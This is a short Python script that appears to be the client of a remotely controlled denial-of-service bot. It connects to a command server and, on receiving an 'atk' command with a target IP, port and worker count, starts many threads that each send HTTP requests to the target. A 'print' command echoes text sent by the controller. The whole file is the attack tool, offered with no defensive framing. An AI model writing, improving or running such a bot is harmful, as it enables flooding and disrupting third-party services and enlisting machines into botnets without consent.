import socket
import threading
import requests

ADDRESS = "" # replace this with your server's IP address
DEFAULT_WORKERS = 100
THREADS = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ADDRESS, 57849))


def atk(ip, port):
    try:
        r = requests.get(f"http://{ip}:{port}")
        print("sent request")
    except:
        print("The port specified does not have a web service running or it is closed.")
        pass

while True and s:
    data = s.recv(128)
    data = data.decode('utf-8').replace("\r\n", "")
    if data.startswith("atk"):
        try:
            ip = data.split(" ")[1]
            port = data.split(" ")[2]
            workers = int(data.split(" ")[3])
        except:
            s.send(b"You didn't specify an argument, please try again.")
            workers = DEFAULT_WORKERS
            break
        for i in range(workers + 1):
            t = threading.Thread(target=atk, args=(ip, port))
            t.start()
            THREADS.append(t)
        for process in THREADS:
            process.join()

    if data.startswith("print"):
        print(data.replace("print ", ""))
